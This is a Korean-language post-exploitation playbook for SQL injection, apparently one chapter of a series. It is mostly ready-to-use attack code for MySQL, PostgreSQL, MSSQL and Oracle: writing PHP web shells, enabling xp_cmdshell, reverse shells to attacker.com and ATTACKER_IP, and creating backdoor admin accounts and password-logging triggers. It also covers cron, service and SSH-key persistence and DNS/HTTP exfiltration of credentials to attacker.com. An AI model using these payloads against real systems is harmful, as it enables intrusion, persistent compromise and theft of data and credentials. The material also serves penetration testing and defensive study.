# SQLi 고급 공격 기법 (Post-Exploitation)

> SQL Injection 이후 시스템 장악 기법
> 버전: 1.0
> 최종 수정: 2025-01-26

---

## 목차

1. [Post-SQLi 개요](#1-post-sqli-개요)
2. [파일 시스템 접근](#2-파일-시스템-접근)
3. [OS 명령 실행](#3-os-명령-실행)
4. [권한 상승](#4-권한-상승)
5. [지속성 확보](#5-지속성-확보)
6. [데이터 대량 추출](#6-데이터-대량-추출)
7. [DBMS별 고급 기법](#7-dbms별-고급-기법)

---

## 1. Post-SQLi 개요

### 1.1 공격 단계 진행

```
┌─────────────────────────────────────────────────────────────┐
│                    Post-SQLi 공격 체인                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Phase 1: SQLi 확보                                         │
│  └─ 데이터 추출 가능한 SQLi 포인트 확보                     │
│                         ↓                                    │
│  Phase 2: 권한 확인                                         │
│  ├─ 현재 DB 사용자 확인                                     │
│  ├─ DBA 권한 여부 확인                                      │
│  └─ 파일/시스템 접근 권한 확인                              │
│                         ↓                                    │
│  Phase 3: 기능 활성화 (필요시)                              │
│  ├─ xp_cmdshell 활성화 (MSSQL)                              │
│  ├─ UDF 생성 (MySQL)                                        │
│  └─ 확장 기능 로드                                          │
│                         ↓                                    │
│  Phase 4: 시스템 접근                                       │
│  ├─ 파일 읽기/쓰기                                          │
│  ├─ OS 명령 실행                                            │
│  └─ 리버스 쉘 획득                                          │
│                         ↓                                    │
│  Phase 5: 지속성/확장                                       │
│  ├─ 백도어 설치                                             │
│  ├─ 권한 상승                                               │
│  └─ 내부 네트워크 피봇팅                                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 권한 확인 쿼리

```sql
-- MySQL: 현재 사용자 및 권한
SELECT user(), current_user();
SELECT super_priv FROM mysql.user WHERE user=user();
SELECT file_priv FROM mysql.user WHERE user=user();
SHOW GRANTS;

-- PostgreSQL: 현재 사용자 및 권한
SELECT current_user, session_user;
SELECT rolsuper FROM pg_roles WHERE rolname=current_user;
SELECT has_database_privilege(current_user, current_database(), 'CREATE');

-- MSSQL: 현재 사용자 및 권한
SELECT SYSTEM_USER, USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Oracle: 현재 사용자 및 권한
SELECT user FROM dual;
SELECT * FROM user_sys_privs;
SELECT * FROM user_role_privs;
```

---

## 2. 파일 시스템 접근

### 2.1 MySQL 파일 읽기

```sql
-- LOAD_FILE() 함수 (FILE 권한 필요)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- 조건
-- 1. FILE 권한 필요
-- 2. secure_file_priv 설정 확인
SELECT @@secure_file_priv;
-- NULL = 어디서든 읽기 가능
-- 빈 문자열 = 어디서든 읽기 가능
-- /path/ = 해당 경로만 허용

-- 16진수로 변환하여 출력 (바이너리 파일)
SELECT HEX(LOAD_FILE('/etc/passwd'));

-- UNION을 통한 출력
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3--
```

### 2.2 MySQL 파일 쓰기

```sql
-- INTO OUTFILE (FILE 권한 + secure_file_priv 허용 필요)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- INTO DUMPFILE (바이너리 파일용)
SELECT 0x3C3F70687020... INTO DUMPFILE '/var/www/html/shell.php';

-- 로그 파일을 통한 우회 (DBA 권한 필요)
SET global general_log = 'ON';
SET global general_log_file = '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>';
SET global general_log = 'OFF';

-- slow query log 악용
SET global slow_query_log = 'ON';
SET global slow_query_log_file = '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>' UNION SELECT SLEEP(11);
```

### 2.3 PostgreSQL 파일 접근

```sql
-- COPY 명령 (Superuser 권한 필요)
-- 파일 읽기
CREATE TABLE temp_file(content text);
COPY temp_file FROM '/etc/passwd';
SELECT * FROM temp_file;

-- 파일 쓰기
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- Large Objects를 통한 파일 접근
SELECT lo_import('/etc/passwd');  -- OID 반환
SELECT lo_get(OID_HERE);          -- 내용 조회
SELECT lo_export(OID_HERE, '/tmp/output.txt');
```

### 2.4 MSSQL 파일 접근

```sql
-- OPENROWSET을 통한 파일 읽기 (Ad Hoc Distributed Queries 활성화 필요)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x;

-- 활성화 (sysadmin 권한)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE;

-- BCP를 통한 파일 쓰기
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';

-- OLE Automation을 통한 파일 쓰기
DECLARE @obj INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @obj OUT;
EXEC sp_OAMethod @obj, 'CreateTextFile', NULL, 'C:\shell.php', 1;
EXEC sp_OADestroy @obj;
```

### 2.5 Oracle 파일 접근

```sql
-- UTL_FILE 패키지 (DBA 권한 + 디렉토리 객체 필요)
-- 디렉토리 생성
CREATE DIRECTORY test_dir AS '/tmp';

-- 파일 읽기
DECLARE
  f UTL_FILE.FILE_TYPE;
  s VARCHAR2(32767);
BEGIN
  f := UTL_FILE.FOPEN('TEST_DIR','passwd','r');
  UTL_FILE.GET_LINE(f, s);
  DBMS_OUTPUT.PUT_LINE(s);
  UTL_FILE.FCLOSE(f);
END;

-- 외부 테이블을 통한 파일 읽기
CREATE TABLE external_passwd (
  line VARCHAR2(4000)
) ORGANIZATION EXTERNAL (
  TYPE ORACLE_LOADER
  DEFAULT DIRECTORY test_dir
  ACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINE)
  LOCATION ('passwd')
);
SELECT * FROM external_passwd;
```

---

## 3. OS 명령 실행

### 3.1 MySQL OS 명령 실행

```sql
-- 방법 1: UDF (User Defined Function) 생성
-- 1. 공유 라이브러리 업로드 (lib_mysqludf_sys.so / .dll)
SELECT 0x7F454C4602... INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';

-- 2. 함수 생성
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';

-- 3. 명령 실행
SELECT sys_exec('id');
SELECT sys_eval('whoami');

-- 방법 2: INTO OUTFILE + Cron/웹쉘
-- 웹쉘 작성
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Cron 작성 (권한 필요)
SELECT '* * * * * root /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'
INTO OUTFILE '/etc/cron.d/reverse_shell';
```

### 3.2 PostgreSQL OS 명령 실행

```sql
-- 방법 1: COPY PROGRAM (PostgreSQL 9.3+, Superuser 필요)
COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';
COPY (SELECT '') TO PROGRAM 'whoami';

-- 리버스 쉘
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';

-- 방법 2: PL/Python 확장 (설치되어 있는 경우)
CREATE EXTENSION plpythonu;
CREATE FUNCTION cmd(c text) RETURNS text AS $$
import os
return os.popen(c).read()
$$ LANGUAGE plpythonu;
SELECT cmd('id');

-- 방법 3: PL/Perl 확장
CREATE EXTENSION plperlu;
CREATE FUNCTION cmd(text) RETURNS text AS $$
return `$_[0]`;
$$ LANGUAGE plperlu;
SELECT cmd('id');
```

### 3.3 MSSQL OS 명령 실행

```sql
-- 방법 1: xp_cmdshell (가장 일반적)
-- 활성화 (sysadmin 권한)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 명령 실행
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

-- 방법 2: OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\output.txt';

-- 방법 3: SQL Server Agent Job
USE msdb;
EXEC sp_add_job @job_name='evil_job';
EXEC sp_add_jobstep @job_name='evil_job', @step_name='step1',
    @subsystem='CmdExec', @command='whoami > C:\output.txt';
EXEC sp_add_jobserver @job_name='evil_job';
EXEC sp_start_job @job_name='evil_job';

-- 방법 4: CLR Assembly
-- C# 악성 코드 컴파일 후 등록
CREATE ASSEMBLY malicious FROM 'C:\path\to\evil.dll' WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE dbo.cmd_exec @cmd NVARCHAR(MAX)
AS EXTERNAL NAME malicious.StoredProcedures.cmd_exec;
EXEC dbo.cmd_exec 'whoami';
```

### 3.4 Oracle OS 명령 실행

```sql
-- 방법 1: Java Stored Procedure (CREATE PROCEDURE + JAVA 권한)
-- Java 클래스 생성
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
import java.io.*;
public class OSCommand {
    public static String run(String cmd) throws Exception {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append("\n");
        return sb.toString();
    }
};
/

CREATE OR REPLACE FUNCTION os_cmd(cmd VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'OSCommand.run(java.lang.String) return java.lang.String';
/

SELECT os_cmd('id') FROM dual;

-- 방법 2: DBMS_SCHEDULER (DBA 권한)
BEGIN
    DBMS_SCHEDULER.CREATE_JOB(
        job_name => 'evil_job',
        job_type => 'EXECUTABLE',
        job_action => '/bin/bash',
        number_of_arguments => 2,
        auto_drop => TRUE
    );
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('evil_job', 1, '-c');
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('evil_job', 2, 'id > /tmp/output.txt');
    DBMS_SCHEDULER.RUN_JOB('evil_job');
END;
/
```

---

## 4. 권한 상승

### 4.1 DB 권한 상승

```sql
-- MySQL: 관리자 계정 생성
INSERT INTO mysql.user (Host, User, Password, Super_priv, File_priv)
VALUES ('%', 'backdoor', PASSWORD('pass123'), 'Y', 'Y');
FLUSH PRIVILEGES;

-- 또는 GRANT 사용
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' IDENTIFIED BY 'pass123' WITH GRANT OPTION;

-- PostgreSQL: Superuser 생성
CREATE USER backdoor WITH SUPERUSER PASSWORD 'pass123';
ALTER USER current_user WITH SUPERUSER;

-- MSSQL: sysadmin 추가
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd';
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
```

### 4.2 OS 권한 상승

```yaml
os_privilege_escalation:
  # 웹쉘 → 리버스 쉘 → 로컬 권한 상승

  step_1_reverse_shell:
    description: "리버스 쉘 획득"
    commands:
      - "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
      - "nc -e /bin/bash ATTACKER_IP 4444"
      - "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"

  step_2_local_privesc:
    description: "로컬 권한 상승 시도"
    vectors:
      - "SUID 바이너리 검색: find / -perm -4000 2>/dev/null"
      - "sudo 설정 확인: sudo -l"
      - "커널 익스플로잇"
      - "Cron 작업 검사"
      - "설정 파일 내 자격증명"
```

---

## 5. 지속성 확보

### 5.1 DB 레벨 백도어

```sql
-- MySQL: 트리거 백도어
CREATE TRIGGER backdoor_trigger
AFTER INSERT ON users
FOR EACH ROW
BEGIN
    INSERT INTO secret_log (data) VALUES (NEW.password);
END;

-- 스토어드 프로시저 백도어
CREATE PROCEDURE admin_backup()
BEGIN
    SELECT * FROM users INTO OUTFILE '/tmp/users.csv';
END;

-- PostgreSQL: 이벤트 트리거
CREATE OR REPLACE FUNCTION log_ddl() RETURNS event_trigger AS $$
BEGIN
    INSERT INTO secret_log VALUES (current_query(), now());
END;
$$ LANGUAGE plpgsql;

CREATE EVENT TRIGGER log_all_ddl ON ddl_command_end EXECUTE FUNCTION log_ddl();

-- MSSQL: 로그인 트리거
CREATE TRIGGER backdoor_login
ON ALL SERVER
FOR LOGON
AS
BEGIN
    INSERT INTO master..secret_log VALUES (ORIGINAL_LOGIN(), GETDATE());
END;
```

### 5.2 시스템 레벨 지속성

```yaml
persistence_techniques:
  # Cron 작업
  cron:
    linux: "echo '*/5 * * * * /tmp/beacon.sh' >> /etc/crontab"
    windows: "schtasks /create /tn evil /tr 'C:\beacon.exe' /sc minute"

  # 웹쉘
  webshell:
    locations:
      - "/var/www/html/.hidden.php"
      - "C:\\inetpub\\wwwroot\\images\\logo.php"
    obfuscation: "base64, gzinflate, str_rot13"

  # 서비스
  service:
    linux: "systemctl enable evil.service"
    windows: "sc create evil binPath= 'C:\evil.exe'"

  # SSH 키
  ssh_key:
    command: "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"
```

---

## 6. 데이터 대량 추출

### 6.1 효율적인 데이터 추출

```sql
-- MySQL: 전체 테이블 덤프
SELECT * FROM users INTO OUTFILE '/tmp/users.csv'
FIELDS TERMINATED BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n';

-- Out-of-Band (DNS)
SELECT LOAD_FILE(CONCAT('\\\\',
    (SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),
    '.attacker.com\\a'));

-- Out-of-Band (HTTP) - UDF 필요
SELECT http_get(CONCAT('http://attacker.com/log?data=',
    (SELECT GROUP_CONCAT(username,':',password) FROM users)));

-- PostgreSQL: COPY로 덤프
COPY users TO '/tmp/users.csv' WITH CSV HEADER;

-- MSSQL: BCP 유틸리티
EXEC xp_cmdshell 'bcp "SELECT * FROM db.dbo.users" queryout C:\users.csv -c -T';

-- MSSQL: DNS exfil
DECLARE @data VARCHAR(1024);
SELECT @data = password FROM users WHERE id=1;
EXEC master..xp_dirtree '\\' + @data + '.attacker.com\a';
```

### 6.2 Blind SQLi 대량 추출 최적화

```yaml
mass_extraction_optimization:
  # 병렬 처리
  parallelization:
    description: "여러 스레드로 동시 추출"
    threads: 10
    per_thread: "각 스레드가 다른 레코드 담당"

  # 청크 단위 추출
  chunking:
    description: "한 번에 여러 문자 추출"
    technique: "SUBSTRING 대신 전체 비교"
    example: "password = 'known_prefix' + char"

  # 비트 추출
  bitwise:
    description: "7비트로 한 문자 추출"
    requests_per_char: 7
    example: "ASCII(SUBSTRING(x,1,1)) & 64"

  # 이진 탐색
  binary_search:
    description: "ASCII 값 범위 절반씩 축소"
    requests_per_char: "7-8회"
    example: "ASCII(x) > 64 → ASCII(x) > 96 → ..."
```

---

## 7. DBMS별 고급 기법

### 7.1 MySQL 고급

```sql
-- 버전별 특수 기능
-- MySQL 5.7+: JSON 함수 악용
SELECT JSON_EXTRACT('{"password":"secret"}', '$.password');

-- MySQL 8.0+: 윈도우 함수로 데이터 추출
SELECT password, ROW_NUMBER() OVER (ORDER BY id) FROM users;

-- Performance Schema 악용 (모니터링 데이터)
SELECT * FROM performance_schema.threads;
SELECT * FROM performance_schema.events_statements_current;

-- Information Schema 완전 활용
SELECT * FROM information_schema.processlist;  -- 실행 중인 쿼리
SELECT * FROM information_schema.user_privileges;  -- 권한 정보
```

### 7.2 PostgreSQL 고급

```sql
-- pg_read_file (Superuser, PostgreSQL 9.1+)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_binary_file('/etc/passwd');

-- pg_ls_dir (디렉토리 목록)
SELECT pg_ls_dir('/etc');

-- dblink를 통한 내부 스캔
CREATE EXTENSION dblink;
SELECT * FROM dblink('host=internal.server dbname=target user=postgres password=pass',
    'SELECT * FROM users') AS t(id int, name text);

-- 확장 기능 악용
CREATE EXTENSION file_fdw;  -- 파일 외부 테이블
CREATE EXTENSION postgres_fdw;  -- 다른 PostgreSQL 접근
```

### 7.3 MSSQL 고급

```sql
-- Linked Server를 통한 피봇팅
SELECT * FROM OPENQUERY(LinkedServer, 'SELECT * FROM users');
EXEC ('xp_cmdshell ''whoami''') AT LinkedServer;

-- Registry 접근
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Services\...';
EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\...', 'value', 'REG_SZ', 'data';

-- 네트워크 정보 수집
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user /domain';

-- SMB 릴레이 공격 트리거
EXEC xp_dirtree '\\attacker.com\share';
EXEC xp_fileexist '\\attacker.com\share\file';
```

### 7.4 Oracle 고급

```sql
-- UTL_HTTP로 HTTP 요청 (데이터 추출)
SELECT UTL_HTTP.REQUEST('http://attacker.com/log?data=' ||
    (SELECT password FROM users WHERE ROWNUM=1)) FROM dual;

-- UTL_INADDR로 DNS 요청
SELECT UTL_INADDR.GET_HOST_ADDRESS(
    (SELECT password FROM users WHERE ROWNUM=1) || '.attacker.com') FROM dual;

-- UTL_TCP로 소켓 통신
DECLARE
  c UTL_TCP.CONNECTION;
  r VARCHAR2(1024);
BEGIN
  c := UTL_TCP.OPEN_CONNECTION('attacker.com', 80);
  r := UTL_TCP.WRITE_LINE(c, 'GET /data HTTP/1.0');
  UTL_TCP.CLOSE_CONNECTION(c);
END;

-- DBMS_LDAP으로 LDAP 쿼리
DECLARE
  s DBMS_LDAP.SESSION;
BEGIN
  s := DBMS_LDAP.init('attacker.com', 389);
END;
```

---

## GR Framework 매핑

```yaml
post_sqli_gr_mapping:
  attack_types:
    file_read:
      layer: "L5-L4"  # Data → File System
      tags: ["D-DB-*", "S-VUL-FILE"]

    os_command:
      layer: "L4-L3"  # File System → OS
      tags: ["T-OS-*", "S-VUL-EXEC"]

    privilege_escalation:
      layer: "L3-L2"  # OS → Privilege
      tags: ["S-CTL-ACCESS", "S-VUL-PRIV"]

    lateral_movement:
      layer: "L3-L2"  # Network
      tags: ["N-*", "S-VUL-LATERAL"]

  severity: "CRITICAL"
  cwe:
    - "CWE-78: OS Command Injection"
    - "CWE-22: Path Traversal"
    - "CWE-269: Improper Privilege Management"
```

---

> **이전 문서**: 06_NoSQL_Injection.md
> **다음 문서**: 08_Lateral_Movement.md
